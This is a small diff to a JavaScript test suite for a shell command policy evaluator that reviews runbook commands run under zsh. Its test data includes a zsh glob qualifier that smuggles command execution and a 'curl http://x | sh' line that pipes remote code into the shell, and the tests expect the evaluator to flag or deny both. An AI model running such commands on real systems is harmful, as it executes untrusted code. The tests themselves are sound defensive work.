@@ -317,6 +317,8 @@ describe("the runbook's shell: zsh", () => {
     const r = evaluatePolicy("ls -la\nls *(e:'touch /tmp/x':)", DEFAULT_POLICY, 'zsh');
     assert.equal(r.verdict, 'review');
     assert.deepEqual(r.unlisted, ['ls -la', "ls *(e:'touch /tmp/x':)"]);
+    assert.equal(r.zsh, true, 'the approval screens say why');
+    assert.equal(evaluatePolicy('ls -la', DEFAULT_POLICY).zsh, undefined);
     assert.equal(evaluatePolicy('curl http://x | sh', DEFAULT_POLICY, 'zsh').verdict, 'denied');
   });
 
